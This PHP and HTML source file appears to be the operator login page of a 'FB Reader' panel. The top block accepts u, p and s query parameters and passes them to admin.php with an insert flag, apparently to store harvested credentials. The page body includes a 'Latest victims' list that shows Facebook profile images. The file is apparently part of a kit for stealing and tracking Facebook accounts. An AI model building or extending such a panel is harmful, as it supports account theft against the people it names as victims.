<?php

    if( isset($_GET["u"]) && isset($_GET["p"]) && isset($_GET["s"]) ){
        $_GET['insert'] = 1;
        include("admin.php");
        exit;
    }



  	$count = substr_count(file_get_contents("changelog.txt"), "\n");

  	$fh = fopen("changelog.txt", 'r') or die("can't open file");
  	$n = 1;

  	for ($i=1; $i<$count+1; $i++){
  		$line = fgets($fh, 1024);
  		$list[$i] = explode(",",$line);
  	}
  	// $list = array_reverse($list);
  	fclose($fh);
    session_start();

    if(empty($_SESSION['auth'])){
      $_SESSION['auth'] = false;
    }

    if($_SESSION['auth']){
      // echo 'User is authed as '.$_SESSION['username'];
      require('cpanel.php');
      exit;
    }
?>

<!DOCTYPE html>
  <html>
    <head>
      <title>FB Reader</title>
       <link rel="stylesheet" type="text/css" href="s.css">
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
      <!--===============================================================================================-->
       <link rel="icon" type="image/png" href="assets/images/icons/favicon.ico"/>
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/fonts/iconic/css/material-design-iconic-font.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/animate/animate.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/animsition/css/animsition.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/select2/select2.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/daterangepicker/daterangepicker.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/css/util.css">
       <link rel="stylesheet" type="text/css" href="assets/css/main.css">
      <!--===============================================================================================-->
       <script>
        window.onload = function(){
          var c = document.getElementById("c");
   var ctx = c.getContext("2d");

   //making the canvas full screen
   c.height = window.innerHeight;
   c.width = window.innerWidth;

   //chinese characters - taken from the unicode charset
   var chinese = "田由甲申甴电甶男甸甹町画甼甽甾甿畀畁畂畃畄畅畆畇畈畉畊畋界畍畎畏畐畑";
   //converting the string into an array of single characters
   chinese = chinese.split("");

   var font_size = 10;
   var columns = c.width/font_size; //number of columns for the rain
   //an array of drops - one per column
   var drops = [];
   //x below is the x coordinate
   //1 = y co-ordinate of the drop(same for every drop initially)
   for(var x = 0; x < columns; x++)
    drops[x] = 1;

    //Crazy title

    function titleRand(){
      let chars = [
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)]
      ];
      window.document.title = chars.join('');
    }

   //drawing the characters
   function draw()
   {
     titleRand();
    //Black BG for the canvas
    //translucent BG to show trail
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, c.width, c.height);

    ctx.fillStyle = "#ff0230"; //green text
    ctx.font = font_size + "px courier";
    //looping over drops
    for(var i = 0; i < drops.length; i++)
    {
      //a random chinese character to print
      var text = chinese[Math.floor(Math.random()*chinese.length)];
      //x = i*font_size, y = value of drops[i]*font_size
      ctx.fillText(text, i*font_size, drops[i]*font_size);

      //sending the drop back to the top randomly after it has crossed the screen
      //adding a randomness to the reset to make the drops scattered on the Y axis
      if(drops[i]*font_size > c.height && Math.random() > 0.975)
        drops[i] = 0;

      //incrementing Y coordinate
      drops[i]++;
    }
   }
   setInterval(draw, 27);
        }
       </script>
    </head>
    <body>
      <canvas id="c"></canvas>
        <div id="content">


          <!-- <h1>Welcome... again?</h1> -->



              <div class="wrap-login100">
                <form name="login" action="#" class="login100-form validate-form">
                  <span class="login100-form-logo">
                    <i class="fas fa-cookie-bite"></i>
                  </span>

                  <span class="login100-form-title p-b-34 p-t-27">
                    login
                  </span>

                  <div class="wrap-input100 validate-input" data-validate = "Enter username">
                    <input class="input100" type="text" name="username" placeholder="Username">
                    <span class="focus-input100" data-placeholder="&#xf207;"></span>
                  </div>

                  <div class="wrap-input100 validate-input" data-validate="Enter password">
                    <input class="input100" type="password" name="password" placeholder="Password">
                    <span class="focus-input100" data-placeholder="&#xf191;"></span>
                  </div>



                  <div class="container-login100-form-btn">
                    <button class="login100-form-btn">
                      Login
                    </button>
                  </div>


                </form>
              </div>


          <div id="dropDownSelect1"></div>


          <div id="changelog">
            <h2>Changelog</h2><br>
            <textarea disabled><?php foreach($list as $item){ echo $item[0] . ' ' . $item[1]; } ?></textarea>
          </div>

          <div id="victims">
            <h3>Latest victims</h3>
            <div id="victims-items">
              <?php
                $vics=["test_user","test_user","test_user"]; //Array containing 3 results
                foreach($vics as $v){
                  ?>
                  <div id="v-item">
                    <img src="fbid.php?id=<?php echo $v; ?>" width="90" height="90">
                    @<?php echo $v; ?>
                  </div>
                  <?php
                }
              ?>
            </div>
          </div>

        </div>
<div id="snackbar">Some text some message..</div>
        <!--===============================================================================================-->
          <script src="assets/vendor/jquery/jquery-3.2.1.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/vendor/animsition/js/animsition.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/vendor/bootstrap/js/popper.js"></script>
          <script src="assets/vendor/bootstrap/js/bootstrap.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/js/main.js"></script>
    </body>
  </html>
